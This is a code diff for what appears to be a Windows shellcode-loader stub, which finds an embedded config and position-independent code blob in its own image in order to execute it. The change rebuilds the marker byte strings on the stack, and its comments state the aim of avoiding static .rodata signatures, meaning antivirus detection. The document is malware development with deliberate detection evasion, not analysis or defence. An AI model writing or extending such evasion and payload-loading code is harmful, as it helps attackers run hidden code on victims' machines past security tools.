@@ -324,16 +324,17 @@ static inline fn_VirtualAlloc stub_resolve_virtualalloc(void) {
 #define PIC_MARKER_LEN      12
 #define PIC_MAX_CAPACITY    (512 * 1024)  /* 512 KB max PIC blob */
 
-/* Config marker: 16 bytes of 0x43 */
-static const BYTE CONFIG_MARKER[CONFIG_MARKER_LEN] = {
-    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
-    0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,
-};
+/* Build markers on the stack to avoid static .rodata signatures.
+   Use these helper macros inside functions that need them. */
+#define BUILD_CONFIG_MARKER(var) \
+    BYTE var[CONFIG_MARKER_LEN]; \
+    stub_memset(var, 0x43, CONFIG_MARKER_LEN)
 
-/* PIC blob marker: "SPECPICBLOB\0" */
-static const BYTE PIC_MARKER[PIC_MARKER_LEN] = {
-    'S','P','E','C','P','I','C','B','L','O','B','\0'
-};
+#define BUILD_PIC_MARKER(var) \
+    BYTE var[PIC_MARKER_LEN]; \
+    var[0]='S'; var[1]='P'; var[2]='E'; var[3]='C'; \
+    var[4]='P'; var[5]='I'; var[6]='C'; var[7]='B'; \
+    var[8]='L'; var[9]='O'; var[10]='B'; var[11]='\0'
 
 /* ------------------------------------------------------------------ */
 /*  Scan for a marker in the stub's own image                          */
@@ -413,9 +414,10 @@ static inline void stub_execute_payload(void) {
 
     PBYTE base = (PBYTE)image_base;
 
-    /* Step 3: Find config marker */
+    /* Step 3: Find config marker (built on stack to avoid .rodata signature) */
+    BUILD_CONFIG_MARKER(cfg_marker);
     PBYTE config_ptr = stub_find_marker_in_image(
-        base, image_size, CONFIG_MARKER, CONFIG_MARKER_LEN);
+        base, image_size, cfg_marker, CONFIG_MARKER_LEN);
     if (!config_ptr)
         STUB_FAIL(103);
 
@@ -431,9 +433,10 @@ static inline void stub_execute_payload(void) {
     if (config_len == 0 || config_len > config_max_size)
         STUB_FAIL(104);
 
-    /* Step 4: Find PIC blob marker */
+    /* Step 4: Find PIC blob marker (built on stack to avoid .rodata signature) */
+    BUILD_PIC_MARKER(pic_marker);
     PBYTE pic_ptr = stub_find_marker_in_image(
-        base, image_size, PIC_MARKER, PIC_MARKER_LEN);
+        base, image_size, pic_marker, PIC_MARKER_LEN);
     if (!pic_ptr)
         STUB_FAIL(105);
 
